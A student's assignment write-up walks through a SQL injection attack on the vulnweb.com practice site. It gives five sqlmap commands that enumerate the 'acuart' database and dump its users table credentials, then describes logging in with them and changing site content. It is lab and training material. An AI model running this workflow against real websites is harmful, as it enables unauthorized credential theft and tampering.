Problem Statment: 
In the assignment 1, you need to perform a SQL Injection attack. You will use SQLMap tool and http://www.vulnweb.com/ or any other use case of live vulnerable website.You can do your own creativity 
and can conduct the attack using any other way / method / technique but the use of SQLMap within Kali Linux to conduct the attack is necessary for this assignment. 

REQUIREMENTS: 
I installed SQLMAP using the command "sudo apt install sqlmap" on my Kali Linux. I have also attached a screenshot of the succesful instalation of sqlmap on my kali linux.

SQL INJECTION ATTACK:
1) Firstly, I opened the Acuart domain http://vulnweb.com which was given to us in moodle i chose this one. we could also chose any other use case of live vulnerable website.

2) Then in the next step we find a vunerable link. In this case the link is http://testphp.vulnweb.com/artists.php?artist=2

3) Then in this step to locate the Database I ran the following command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 --dbs" basically this will scan the website and 
tell us the database that is being used at the backend and the number of databases and their names. i have attached the screenshot for this command.

4) In this step to locate the tables. I ran the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables". I used the name of the data base in the arguement -D (acuart) in the command. This returned 
me the tables inside the database. In my case, a list of 8 tables were returned; "artists, carts, categ, featured, guestbook, pictures, products, users". i have also attached the screenshot for this command.

5) Moving towards the next command. In this step I entered the name of the table we will be focusing on the users table and run the command
"sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns". This command will show us all the columns in this table. i have also attached the screenshot for this command.

6) Finally, now in the users table, we will dump all the data in the uname and pass by running two commands. i firstly run the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump"
and after that i run the command "sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump" this will dump all the data in that file to a csv file. After we have done that we will find that the 
username and pasword to both be set to test. i have also attached the screenshot for this command.

7) After i have executed the SQL Injection Attack succesfuly. I went to http://testphp.vulnweb.com/login.php and logged in using the information that i had obtained above. After logging in, I then changed the information 
on the website and then took a screenshot which i have also attached. 

8) To conclude, I can say that intotal i ran 5 commands which are as follows:
   Command 1: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 --dbs
   Command 2: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables
   Command 3: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns
   Command 4: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
   Command 5: sqlmap http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump
